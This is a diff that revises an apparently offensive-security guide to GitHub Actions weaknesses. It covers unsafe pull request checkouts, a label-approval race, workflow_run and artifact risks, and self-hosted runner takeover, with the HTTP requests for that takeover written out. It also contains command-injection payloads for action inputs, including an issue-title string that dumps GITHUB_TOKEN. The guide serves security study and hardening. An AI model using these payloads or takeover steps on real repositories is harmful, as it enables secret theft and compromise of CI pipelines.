+  2. `pull_request_target` runs in the context of the target repository of the pull request, rather than in the merge commit. This means the standard checkout action uses the target repository to prevent accidental usage of a user-supplied code.
 
 - [issue_comment](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#issue_comment) runs a workflow when a pull request comment is created, edited, or deleted.
-- [workflow_run](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) runs a workflow when a workflow run is requested or completed. It allows executing a workflow based on execution or completion of another workflow.
+- [workflow_run](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) runs a workflow when a workflow run is requested or completed. It allows the execution of a workflow based on the execution or completion of another workflow.
 
-Normally, using `pull_request_target`, `issue_comment` or `workflow_run` is safe because actions only run code from a target repository, not an incoming pull request. However, if a workflow uses these events with an explicit checkout of a pull request, it can lead to untrusted code execution.
+Normally, using `pull_request_target`, `issue_comment` or `workflow_run` is safe because actions only run code from a target repository, not an incoming pull request. However, if a workflow uses these events with an explicit checkout of a pull request, it can lead to untrusted commands or code execution.
 
-```yml
+```yaml
 on:
   pull_request_target
 
@@ -365,29 +618,29 @@ jobs:
     name: Build and test
     runs-on: ubuntu-latest
     steps:
-        # check out incoming PR code
-        - uses: actions/checkout@v2
+        # 1. Check out the content from an incoming pull request
+        - uses: actions/checkout@v3
           with:
             ref: ${{ github.event.pull_request.head.sha }}
         - uses: actions/setup-node@v1
-        # potentially untrusted code is being run during npm install or npm build
-        # as the build scripts and referenced packages are controlled by the author of the PR
+        # 2. Potentially untrusted commands are being run during "npm install" or "npm build" as
+        #    the build scripts and referenced packages are controlled by the author of the pull request
         - run: |
             npm install
             npm build
 ```
 
-There are several ways to checkout a code from a pull request:
+There are several ways to check out a code from a pull request:
 
-- [actions/checkout](https://github.com/actions/checkout) to checkout changes from a head repo
+- Using the [actions/checkout](https://github.com/actions/checkout) action to checkout changes from a head repository.
 
     ```yaml
-    - uses: actions/checkout@v2
+    - uses: actions/checkout@v3
       with:
         ref: refs/pull/${{ github.event.pull_request.number }}/merge
     ```
 
-- Explicitly checking out with `git` in the `run:` block
+- Explicitly checking out using `git` in the `run:` block.
 
     ```yaml
     run: |
@@ -400,11 +653,10 @@ There are several ways to checkout a code from a pull request:
       HEAD_BRANCH: ${{ github.head_ref }}
     ```
 
-- Use Github API or third-party actions:
+- Use GitHub API or third-party actions:
 
     ```yaml
     - uses: octokit/request-action@v2.1.4
-      id: get_pull_request
       with:
         route: GET /repos/{owner}/{repo}/pulls/{number}
         owner: namespace
@@ -414,7 +666,7 @@ There are several ways to checkout a code from a pull request:
         GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
     ```
 
-The following context variables may help to find checking out from an incoming pull request:
+The following context variables may help to find cases where an incoming pull request is checked out:
 
 ```yaml
 github.head_ref
@@ -440,9 +692,46 @@ References:
 - [GHSL-2021-1032: Unauthorized repository modification or secrets exfiltration from a Pull Request in Solana GitHub workflow](https://securitylab.github.com/advisories/GHSL-2021-1032_Solana/)
 - [Writeup: GitHub Actions check-spelling community workflow - GITHUB_TOKEN leakage via advice.txt symlink](https://github.com/justinsteven/advisories/blob/master/2021_github_actions_checkspelling_token_leak_via_advice_symlink.md)
 
-# Misuse of the pull_request_target event in non-default branches
+## Confusion between head.ref and head.sha
 
-The `pull_request_target` based workflows can be triggered in non-default branches, if there is no restriction based on `branches` and `branches-ignore` filters:
+Sometimes developers implement workflows in such a way that they require manual review before execution. It is guaranteed that untrusted content will be reviewed by a maintainer before execution. Consider the following workflow:
+
+```yaml
+name: Handle pull requests
+
+on:
+  pull_request_target:
+    types:
+      - labeled
+
+jobs:
+  build:
+    name: Build and test
+    runs-on: ubuntu-latest
+    if: ${{ github.event.label.name == 'approved' }}
+    steps:
+      - uses: actions/checkout@v3
+        with:
+          ref: ${{ github.event.pull_request.head.ref }}
+      - uses: actions/setup-node@v1
+      - name: Build
+        run: |
+          npm install
+          npm build
+```
+
+As can be seen, the workflow is triggered when the `approved` label is set on a pull request. In other words, only a maintainer with write permissions can manually trigger this workflow. However, the workflow is still vulnerable, because it uses `github.event.pull_request.head.ref` to check out the repository content. Consider the difference between `head.ref` and `head.sha`. `head.ref` points to a branch while `head.sha` points to a commit. This means that if `head.sha` is used to check out a repository, the content will be fetched from the commit that was used to trigger the workflow. In the case of labeling a pull request, it will be the HEAD commit that was reviewed by a maintainer before the label was set. However, if `head.ref` is used, a repository is checked out from the base branch. As a result, an attacker can inject a malicious payload right after the manual approval. The attack flow may look like this:
+
+1. An attacker forks a target repository.
+1. An attacker makes valid changes and opens a pull request.
+1. An attacker waits for the label to be set.
+1. A maintainer sets the `approved` label that triggers the vulnerable workflow.
+1. An attacker pushes a malicious payload to the fork.
+1. The workflow checks out the malicious payload and executes them.
+
+## Misuse of the pull_request_target event in non-default branches
+
+The `pull_request_target` event can be used to trigger workflows in non-default branches if there is no restriction based on `branches` and `branches-ignore` filters.
 
 ```yaml
 on: 
@@ -451,72 +740,26 @@ on:
       main
       release*
       v1.*.*
-
 # ...
 ```
 
-In this case, Github will use a workflow from a non-default branch instead of the main one when creating a PR to that branch. So, if there is a vulnerable workflow in a non-default branch, you can open a PR to that branch and exploit a vulnerability. This is a common pitfall when fixing vulnerabilities, developers can only fix a vulnerability in the main branch and leave the vulnerable version in non-default branches.
+GitHub uses the workflow from a non-default branch when creating a pull request to that branch. Therefore, if there is a vulnerable workflow in a non-default branch that can be triggered by the `pull_request_target` event, an attacker can open a pull request to that branch and exploit a vulnerability.
+
+This is a common pitfall when fixing vulnerabilities, developers can only fix a vulnerability in the default branch and leave the vulnerable version in non-default branches.
 
 # Misuse of the workflow_run event
 
-[workflow_run](https://docs.github.com/en/actions/learn-github-actions/events-that-trigger-workflows#workflow_run) was introduced to enable scenarios that require building the untrusted code and also need write permissions to update the PR with e.g. code coverage results or other test results. To do this in a secure manner, the untrusted code is handled via the [pull_request](https://docs.github.com/en/actions/learn-github-actions/events-that-trigger-workflows#pull_request) trigger so that it is isolated in an unprivileged environment. The workflow processing the PR stores any results like code coverage or failed/passed tests in artefacts and exits. The following workflow then starts on `workflow_run` where it is granted write permission to the target repository and access to repository secrets, so that it can download the artefacts and make any necessary modifications to the repository or interact with third party services that require repository secrets (e.g. API tokens).
+[workflow_run](https://docs.github.com/en/actions/learn-github-actions/events-that-trigger-workflows#workflow_run) was introduced to enable scenarios that require building the untrusted code and also need write permissions to update a pull request with e.g. code coverage results or other test results. To do this in a secure manner, the untrusted code is handled via the [pull_request](https://docs.github.com/en/actions/learn-github-actions/events-that-trigger-workflows#pull_request) trigger so that it is isolated in an unprivileged environment. The workflow processing a pull request stores any results like code coverage or failed/passed tests in artifacts and exits. The following workflow then starts on `workflow_run` where it is granted write permission to the target repository and access to repository secrets so that it can download the artifacts and make any necessary modifications to the repository or interact with third-party services that require repository secrets (e.g. API tokens).
 
-Nevertheless, there are still ways of transferring data controlled by a user from untrusted PRs to a privileged `workflow_run` workflow context:
+Nevertheless, there are still ways of transferring data controlled by a user from untrusted pull requests to a privileged `workflow_run` workflow context:
 
-1. Using the `github.event.workflow_run` context. Please, check out [Misuse of contexts](#misuse-of-contexts) and [Misuse of the events related to incoming PRs](#misuse-of-the-events-related-to-incoming-prs) for more details.
-1. Using artefacts. For instance, artefacts can contain binaries or scripts built from an untrusted PR that will be run in a privileged workflow.
+1. The `github.event.workflow_run` context. Please, check out [Contexts misusing](#contexts-misusing) and [Misuse of the events related to incoming pull requests](#misuse-of-the-events-related-to-incoming-pull-requests) for more details.
+1. Artifacts. Please, check out [Artifact poisoning](#artifact-poisoning) for more details.
 
-Actually, even if a `workflow_run` workflow does not properly use context variables or artefacts, it may still be unexploitable because the `pull_request` event requires an approval from owners for PRs from forked repos. By default, `pull_request` workflows [require approval only for first time contributors](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#controlling-changes-from-forks-to-workflows-in-public-repositories). So, if a repository does not require approval for all outside collaborators (default behaviour), you can actually make changes to the target repo to become a contributor. After that, you will be able to fully control a `pull_request` workflow for exploitation.
+Even if a `workflow_run` workflow does not properly use context variables or artifacts, it may still be unexploitable because the `pull_request` event requires approval from maintainers for pull requests from forks. By default, `pull_request` workflows [require approval only for first-time contributors](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#controlling-changes-from-forks-to-workflows-in-public-repositories). So, if a repository does not require approval for all outside collaborators (default behaviour), you can make changes to the target repository to become a contributor. After that, you will be able to fully control a `pull_request` workflow for exploitation.
 
 References:
 - [GitHub Security Lab: Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
-
-## Detection of the download of artefacts
-
-You can use the following examples to detect artefacts downloading:
-
-1. `actions/github-script` with `github.rest.actions.listWorkflowRunArtifacts()`
-
-    ```yaml
-    - uses: actions/github-script@v6
-      with:
-        script: |
-          let allArtifacts = await github.rest.actions.listWorkflowRunArtifacts({
-              owner: context.repo.owner,
-              repo: context.repo.repo,
-              run_id: context.payload.workflow_run.id,
-          });
-          let matchArtifact = allArtifacts.data.artifacts.filter((artifact) => {
-              return artifact.name == "<ARTEFACT_NAME>"
-          })[0];
-          let download = await github.rest.actions.downloadArtifact({
-              owner: context.repo.owner,
-              repo: context.repo.repo,
-              artifact_id: matchArtifact.id,
-              archive_format: 'zip',
-          });
-    ```
-
-1. Third-party actions, such as [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)
-
-    ```yaml
-    - uses: dawidd6/action-download-artifact@v2
-    ```
-
-1. `gh run download`
-
-    ```yaml
-    - run: gh run download "${WORKFLOW_RUN_ID}" --repo "${GITHUB_REPOSITORY}" --name "comment"
-    ```
-
-1. `gh api` with `github.event.workflow_run.artifacts_url`
-
-    ```yaml
-    run: |
-      artifacts_url=${{ github.event.workflow_run.artifacts_url }}
-      gh api "$artifacts_url" -q '.artifacts[] | [.name, .archive_download_url] | @tsv' | while read artifact
-      # ...
-    ```
 
 # Misuse of self-hosted runners
 
@@ -552,22 +795,22 @@ Content-Type: application/json; charset=utf-8; api-version=6.0-preview.2
 As a result, an ephemeral runner has the following lifecycle:
 
 1. The runner is registered with the GitHub Actions service.
-2. The runner takes an one job and performs it.
-3. When the runner completes the job, it cleans up local environment (`.runner`, `.credentials`, `.credentials_rsaparams` files)
-4. The GitHub Actions service automatically de-registers the runner.
+1. The runner takes one job and performs it.
+1. When the runner completes the job, it cleans up the local environment (`.runner`, `.credentials`, `.credentials_rsaparams` files).
+1. The GitHub Actions service automatically de-registers the runner.
 
-Therefore, if an attacker gain access to ephemeral self-hosted runner, they will not be able to affect other jobs.
+Therefore, if an attacker gains access to an ephemeral self-hosted runner, they will not be able to affect other jobs.
 
-However, self-hosted runners are not launched as an ephemeral by default and there is no guarantee around running in ephemeral clean virtual environment. So, runners can be persistently compromised by untrusted code in a workflow. An attacker can abuse a workflow to access the following files that are stored in a root folder of a runner host:
+However, self-hosted runners are not launched as ephemeral by default and there is no guarantee around running in an ephemeral clean virtual environment. So, runners can be persistently compromised by untrusted code in a workflow. An attacker can abuse a workflow to access the following files that are stored in a root folder of a runner host:
 
-- `.runner` that contains general info about a runner (id, name, pool id, etc.).
+- `.runner` that contains general info about a runner, such as an id, name, pool id, etc.
 - `.credentials` that contains authentication details such as the scheme used and authorization URL.
-- `.credentials_rsaparams` that contains the RSA parameters that were genereted during registrarion and are used to sign JWT tokens.
+- `.credentials_rsaparams` that contains the RSA parameters that were generated during the registration and are used to sign JWT tokens.
 
 These files can be used to takeover a self-hosted runner with the next steps:
 
 1. Fetch `.runner`, `.credentials`, `.credentials_rsaparams` files with all the necessary data written during the runner registration.
-2. Get an access token using the following request:
+1. Get an access token using the following request:
 
     ```http
     POST /_apis/oauth2/token/<UUID> HTTP/2
@@ -579,10 +822,10 @@ These files can be used to takeover a self-hosted runner with the next steps:
     ```
 
     Where:
-    - `UUID` can be found in `.credentials` file.
+    - `UUID` can be found in the `.credentials` file.
     - `BEARER_TOKEN` [is generated](https://github.com/actions/runner/blob/a7aadf561531e581f92663e88d33e1d488cbcd7a/src/Sdk/WebApi/WebApi/OAuth/VssOAuthJwtBearerAssertion.cs#L120) using the parameters from `.credentials` and `.credentials_rsaparams` files.
 
-3. Remove a current session:
+1. Remove a current session:
 
     ```http
     DELETE /<RANDOM_PREFIX>/_apis/distributedtask/pools/1/sessions/<SESSION_ID> HTTP/2
@@ -592,14 +835,14 @@ These files can be used to takeover a self-hosted runner with the next steps:
     ```
 
     Where:
-    - `RANDOM_PREFIX` can be found in `.runner` file.
-    - `SESSION_ID` is a session ID which can be found in `_diag/Runner_<DATE>-utc.log` file with the runner logs.
+    - `RANDOM_PREFIX` can be found in the `.runner` file.
+    - `SESSION_ID` is a session ID that can be found in the `_diag/Runner_<DATE>-utc.log` file with the runner logs.
     - `BEARER_TOKEN` is a bearer token from the response in the previous step.
 
-4. Copy `.runner`, `.credentials`, `.credentials_rsaparams` files to a root folder of a malicious runner.
-5. Run a malicious runner.
+1. Copy the `.runner`, `.credentials`, `.credentials_rsaparams` files to a root folder of a malicious runner.
+1. Run a malicious runner.
 
-The takeover has the greatest impact when a self-hosted runner is defined at the organization or enterprise level, because Github can schedule workflows from multiple repositories onto the same runner. It allows an attacker to gain access to the jobs which will use the malicious runner.
+The takeover has the greatest impact when a self-hosted runner is defined at the organization or enterprise level because GitHub can schedule workflows from multiple repositories onto the same runner. It allows an attacker to gain access to the jobs which will use the malicious runner.
 
 References:
 - [GitHub Docs: Hosting your own runners](https://docs.github.com/en/actions/hosting-your-own-runners)
@@ -609,39 +852,35 @@ References:
 
 ## Using the pull_request event with self-hosted runners
 
-Github does not provide a mechanism to prevent `pull_request` based workflows from being triggered from a forked repository. The only thing available is to [require approval for all outside collaborators](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#controlling-changes-from-forks-to-workflows-in-public-repositories). However, if approval is only required for the first contribution, you can make some valid changes and then add a `pull_request` based workflow running on a self-hosted runner.
+GitHub does not provide a mechanism to prevent the `pull_request` event from being triggered from forks. The only thing available is to [require approval for all outside collaborators](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#controlling-changes-from-forks-to-workflows-in-public-repositories). However, if approval is only required for the first contribution, you can make some valid changes and then add a malicious workflow that uses `pull_request` for running on a self-hosted runner.
 
 References:
 - [GitHub Docs: Managing GitHub Actions settings for a repository](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository)
 
 ## Detection of the use of self-hosted runners
 
-You can find a using of self-hosted runners by the following [runs-on](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idruns-on) labels (remember about [a build matrix](https://docs.github.com/en/actions/using-jobs/using-a-build-matrix-for-your-jobs) as well):
-- `self-hosted` default label applied to all self-hosted runners
-- `linux`, `windows`, or `macOS` applied depending on operating system
-- `x64`, `ARM`, or `ARM64` applied depending on hardware architecture
-- Custom labels, which are manually assigned to self-hosted runners (there is a [list](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#choosing-github-hosted-runners) with Github-hosted runner labels which can't be custom ones)
+You can find using of self-hosted runners by the following [runs-on](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idruns-on) labels (remember about [a build matrix](https://docs.github.com/en/actions/using-jobs/using-a-build-matrix-for-your-jobs) as well):
+- `self-hosted` default label applied to all self-hosted runners.
+- `linux`, `windows`, or `macOS` applied depending on an operating system.
+- `x64`, `ARM`, or `ARM64` applied depending on hardware architecture.
+- Custom labels, which are manually assigned to self-hosted runners (there is a [list](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#choosing-github-hosted-runners) with GitHub-hosted runner labels which can't be custom ones).
 
 # Using vulnerable actions
 
-An [action](https://docs.github.com/en/actions/learn-github-actions/understanding-github-actions) is a custom application for the GitHub Actions platform that performs a complex but frequently repeated task. Like any code [actions can be vulnerable](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions) - it can be a vulnerability in the code of an action or a used package or dependency. Since individual jobs in a workflow can interact with other jobs, if one of the jobs uses a vulnerable action, it can compromise the entire workflow. For example, a job querying the environment variables used by a later job, writing files to a shared directory that a later job processes, or even more directly by interacting with the Docker socket and inspecting other running containers and executing commands in them.
+An [action](https://docs.github.com/en/actions/learn-github-actions/understanding-github-actions) is a custom application for the GitHub Actions platform that performs a complex but frequently repeated task. Like any code [actions can be vulnerable](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions) - it can be a vulnerability in the code of an action or a used package or dependency. Since individual jobs in a workflow can interact with other jobs, if one of the jobs uses a vulnerable action, it can compromise the entire workflow. For example, a job querying the environment variables used by a later job, writing files to a shared directory that latter job processes, or even more directly by interacting with the Docker socket and inspecting other running containers and executing commands in them.
 
-There are three type of actions:
+There are three types of actions:
 - [Composite action](#composite-action)
 - [JavaScript action](#javascript-action)
 - [Docker container action](#docker-action)
 
 ## Composite action
 
-[Composite action](https://docs.github.com/en/actions/creating-actions/creating-a-composite-action) is used to execute the defined steps that can run shell code or use other actions.
-
-{% hint style="info" %}
-Since a composite action can run scripts written on different languages (bash, python, go, etc.), they can also be vulnerable to common weaknesses like code/command injection, path traversal, and etc.
-{% endhint %}
+[Composite action](https://docs.github.com/en/actions/creating-actions/creating-a-composite-action) is used to execute the defined steps that can run shell code or use other actions. Since a composite action can run scripts written in different languages (bash, python, go, etc.), they can also be vulnerable to common weaknesses like code and command injection, path traversal, etc.
 
 ### Command injection
 
-Composite actions allow defining [inputs](https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#inputs) which can be used during execution:
+Composite actions allow defining [inputs](https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#inputs) that can be used during execution:
 
 ```yml
 # fake-actions/composite-action
@@ -660,7 +899,7 @@ runs:
       shell: bash
 ```
 
-Handling inputs is performed using variable interpolation `${{ ... }}`. Therefore, if the inputs are embedded directly to the [run:](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idstepsrun) block, an attacker can inject arbitrary commands:
+Handling inputs is performed using variable interpolation `${{ ... }}`. Therefore, if the inputs are embedded directly into the [run:](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idstepsrun) block, an attacker can inject arbitrary commands:
 
 ```yml
 on: workflow_dispatch
@@ -684,7 +923,7 @@ jobs:
           who-to-greet: 'World!; echo hop'
 ```
 
-As a result, it is possible at least extract secrets from environment variables and generated shell scripts. For instance, in the snippet below an attacker can open an issues with title `";{cat,/home/runner/work/_temp/$({xxd,-r,-p}<<<2a)}|{base64,-w0};#` to dump `GITHUB_TOKEN`:
+As a result, it is possible at least extract secrets from environment variables and generated shell scripts. For instance, in the snippet below an attacker can open an issue with title `";{cat,/home/runner/work/_temp/$({xxd,-r,-p}<<<2a)}|{base64,-w0};#` to dump `GITHUB_TOKEN`:
 
 ```yml
 # Vulnerable third-party action:
@@ -736,11 +975,11 @@ jobs:
           issue_title: ${{ github.event.issue.title }}
 ```
 
-The same is applicable for contexts that can be used for command injection, check [Misuse of contexts](#misuse-of-contexts).
+The same applies to contexts that can be used for command injection, check out [Contexts misusing](#contexts-misusing).
 
 ### Disclosure of sensitive data
 
-New sensitive data may appear during execution of composite actions, such as temporary tokens, retrieved data, etc. Github Actions allow developers to mask this data in logs using [add-mask workflow command](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#masking-a-value-in-log). So, if the `add-mask` is not used or [workflow commands have been stopped](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#stopping-and-starting-workflow-commands) sensitive data can leak to the run logs:
+New sensitive data may appear during the execution of composite actions, such as temporary tokens, retrieved data, etc. GitHub Actions allow developers to mask this data in logs using [add-mask](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#masking-a-value-in-log) workflow command. So, if the `add-mask` is not used or [workflow commands have been stopped](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#stopping-and-starting-workflow-commands) sensitive data can leak to the run logs:
 
 ```yaml
 name: 'API requester'
@@ -761,19 +1000,15 @@ runs:
 
 ## JavaScript action
 
-[JavaScript action](https://docs.github.com/en/actions/creating-actions/creating-a-javascript-action) is used to execute a Node.js code.
+[JavaScript action](https://docs.github.com/en/actions/creating-actions/creating-a-javascript-action) is used to execute a Node.js code. Since a JavaScript action is a Node.js application, it can be vulnerable to common Node.js weaknesses such as code and command injection, prototype pollution, etc.
 
 {% hint style="info" %}
-[actions/github-script](https://github.com/actions/github-script) allows executing of JavaScript code as well and all vulnerabilities described here apply to `github-script`
-{% endhint %}
-
-{% hint style="info" %}
-Since a JavaScript action is a Node.js application, it can be vulnerable to common Node.js weaknesses such as code/command injection, prototype pollution, etc.
+[actions/github-script](https://github.com/actions/github-script) allows executing of JavaScript code as well and all vulnerabilities described here apply to the `actions/github-script` action
 {% endhint %}
 
 ### Command injection
 
-Github Actions toolkit provides the [@actions/exec](https://github.com/actions/toolkit/tree/main/packages/exec) package to execute shell commands:
+GitHub Actions toolkit provides the [@actions/exec](https://github.com/actions/toolkit/tree/main/packages/exec) package to execute shell commands:
 
 ```javascript
 const exec = require('@actions/exec');
@@ -789,13 +1024,13 @@ await exec.exec('node index.js');
       await exec.exec('node index.js');
 ```
 
-If user-controlled data ([inputs](https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#inputs), github context, etc.) is passed directly to the `exec` it can lead to command or argument injection.
+If user-controlled data ([inputs](https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#inputs), GitHub context, etc.) is passed directly to the `exec` it can lead to command or argument injection.
 
 ### Disclosure of sensitive data
 
-New sensitive data may appear during a JavaScript action execution, such as temporary tokens, retrieved data, etc. In order for such sensitive data to be masked in the logs, the [@actions/core](https://github.com/actions/toolkit/tree/main/packages/core) provides the [setSecret](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret) method. `code.setSecret` registers the data in the runner to ensure it is masked in the logs. Therefore, if the `code.setSecret` is not used sensitive data can leak to workflow run logs.
+New sensitive data may appear during the JavaScript action execution, such as temporary tokens, retrieved data, etc. For such sensitive data to be masked in the logs, the [@actions/core](https://github.com/actions/toolkit/tree/main/packages/core) provides the [core.setSecret](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret) method. `code.setSecret` registers the data in the runner to ensure it is masked in the logs. Therefore, if the `code.setSecret` is not used sensitive data can leak to workflow run logs.
 
-For instance, the sample below will leak `api_token` to logs if the [echoing](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#echoing-command-outputs) or [debug mode](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/enabling-debug-logging) is enabled:
+For instance, the sample below will leak `api_token` to logs if the [debug mode](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/enabling-debug-logging) is enabled:
 
 ```javascript
 const core = require("@actions/core");
@@ -804,14 +1039,16 @@ let api_token = client.get_token();
 core.setOutput("api_token", token);
 ```
 
+The workflow log discloses the token in plaintext:
+
 ```
 // workflow run log
-::set-output name=actions_runtime_token::tETDURnbqsGTLtLB
+##[debug]Set output api_token = cG1jTXaVaAT2K1Qur6G2dryZ6WfuCZcuGck3VU
 ```
 
 ### Github context
 
-JavaScript actions are able to access the [GitHub context](https://docs.github.com/en/actions/learn-github-actions/contexts#github-context) via [@actions/github](https://github.com/actions/toolkit/tree/main/packages/github):
+JavaScript actions can access the [GitHub context](https://docs.github.com/en/actions/learn-github-actions/contexts#github-context) via [@actions/github](https://github.com/actions/toolkit/tree/main/packages/github):
 
 ```javascript
 const github = require("@actions/github");
@@ -819,7 +1056,7 @@ const context = github.context;
 console.log(context.repo.repo);
 ```
 
-[github-script](https://github.com/actions/github-script) provides the [context](https://github.com/actions/github-script#actionsgithub-script) object to access the Github context:
+[github-script](https://github.com/actions/github-script) provides the [context](https://github.com/actions/github-script#actionsgithub-script) object to access the GitHub context:
 
 ```yaml
 - uses: actions/github-script@v6
@@ -828,7 +1065,7 @@ console.log(context.repo.repo);
       console.log(context.repo.repo)
 ```
 
-The next variables in the Github context can be controlled by a user who opens a PR from a forked repo, creates an issue, submits a comment to a PR, and etc.:
+The next variables in the GitHub context are controlled by a user:
 
 - `context.payload.pull_request.title`
 - `context.payload.pull_request.body`
@@ -864,10 +1101,10 @@ const result = await octokit.graphql(query, variables);
       const result = await github.graphql(query, variables);
 ```
 
-If user-controlled data ([inputs](https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#inputs), github context, etc.) is passed directly to the `query` it can lead to an injection to GraphQL request.
+If user-controlled data ([inputs](https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#inputs), GitHub context, etc.) is passed directly to the `query` it can lead to an injection into GraphQL request.
 
 {% hint style="info" %}
-There is [octokit/graphql-action](https://github.com/octokit/graphql-action) which can be vulnerable to the injection as well, check [Misuse of contexts](#misuse-of-contexts)
+There is [octokit/graphql-action](https://github.com/octokit/graphql-action) which can be vulnerable to the injection as well, check out [Contexts misusing](#contexts-misusing)
 {% endhint %}
 
 ### Octokit REST API injection
@@ -903,27 +1140,23 @@ const { data: pullRequest } = await octokit.rest.pulls.get({
       });
 ```
 
-If user-controlled data ([inputs](https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#inputs), github context, etc.) is passed directly to the next methods it can lead to an injection to requests to REST API:
+If user-controlled data ([inputs](https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#inputs), GitHub context, etc.) is passed directly to the next methods it can lead to injection into requests to REST API:
 
 - [octokit.request()](https://octokit.github.io/rest.js/v18#custom-requests)
 - [octokit.paginate()](https://octokit.github.io/rest.js/v18#pagination)
 - [octokit.registerEndpoints()](https://octokit.github.io/rest.js/v18#custom-endpoint-methods)
 
 {% hint style="info" %}
-There is [octokit/request-action](https://github.com/octokit/request-action) which can be vulnerable to the injection as well, check [Misuse of contexts](#misuse-of-contexts)
+There is [octokit/request-action](https://github.com/octokit/request-action) which can be vulnerable to the injection as well, check out [Contexts misusing](#contexts-misusing)
 {% endhint %}
 
 ## Docker action
 
-[Docker container action](https://docs.github.com/en/actions/creating-actions/creating-a-docker-container-action) is used to run a Docker container and execute a code in Docker.
-
-{% hint style="info" %}
-Since a Docker container action runs scripts written on different languages (bash, python, go, etc.), they can also be vulnerable to common weaknesses like code/command injection, path traversal, and etc.
-{% endhint %}
+[Docker container action](https://docs.github.com/en/actions/creating-actions/creating-a-docker-container-action) is used to run a Docker container and execute a code in Docker. Since a Docker container action runs scripts written in different languages (bash, python, go, etc.), they can also be vulnerable to common weaknesses like code and command injection, path traversal, etc.
 
 ### Disclosure of sensitive data
 
-New sensitive data may appear during execution of Docker container actions, such as temporary tokens, retrieved data, etc. Github Actions allow developers to mask this data in logs using [add-mask workflow command](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#masking-a-value-in-log). So, if the `add-mask` is not used or [workflow commands have been stopped](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#stopping-and-starting-workflow-commands) sensitive data can leak to the run logs:
+New sensitive data may appear during the execution of Docker container actions, such as temporary tokens, retrieved data, etc. GitHub Actions allow developers to mask this data in logs using [add-mask](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#masking-a-value-in-log) workflow command. So, if the `add-mask` is not used or [workflow commands have been stopped](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#stopping-and-starting-workflow-commands) sensitive data can leak to the run logs:
 
 ```yaml
 name: 'API requester'
@@ -949,10 +1182,10 @@ curl -v -H "AUTH: ${BASIC_AUTH}" https://api.website.com
 
 ### Using a malicious docker image
 
-In addition to a local `Dockerfile` in a repositoy, you can use third-party Docker images from a registry. Therefore, these Docker images may be vulnerable, causing the container to be compromised.
+In addition to a local `Dockerfile` in a repository, third-party Docker images from a registry can be used. Therefore, these Docker images may be vulnerable, causing the container to be compromised.
 
 {% hint style="info" %}
-The same is applicable for [job](https://docs.github.com/en/actions/learn-github-actions/workflow-syntax-for-github-actions#jobsjob_idcontainer) and [service](https://docs.github.com/en/actions/learn-github-actions/workflow-syntax-for-github-actions#jobsjob_idservices) containers
+The same applies for the [job](https://docs.github.com/en/actions/learn-github-actions/workflow-syntax-for-github-actions#jobsjob_idcontainer) and [service](https://docs.github.com/en/actions/learn-github-actions/workflow-syntax-for-github-actions#jobsjob_idservices) containers
 {% endhint %}
 
 References:
@@ -975,12 +1208,16 @@ Github runner passes part of the environment variables and mounts volumes when r
 
 Here it is worth paying attention to at least the following things:
 
-1. Exposed Docker socket at `/var/run/docker.sock`. It allows you to escape from the container. Please, check out [Container: Escaping - Exposed Docker Socket](/Container/Escaping/exposed-docker-socket.md)
-2. `/github/workspace` is a folder with a repository content. For example, you can grab a repository token from `/github/workspace/.git/config` file, check out "[Exfiltrating data from a runner](#exfiltrating-data-from-a-runner)" section.
+1. Exposed Docker socket at `/var/run/docker.sock`. It allows an attacker to escape from the container. Please, check out [Container: Escaping - Exposed Docker Socket](/Container/Escaping/exposed-docker-socket.md)
+1. `/github/workspace` is a folder with repository content. For example, an attacker can grab a repository token from the `/github/workspace/.git/config` file, check out the "[Exfiltrating data from a runner](#exfiltrating-data-from-a-runner)" section.
+
+## Unclaimed actions
+
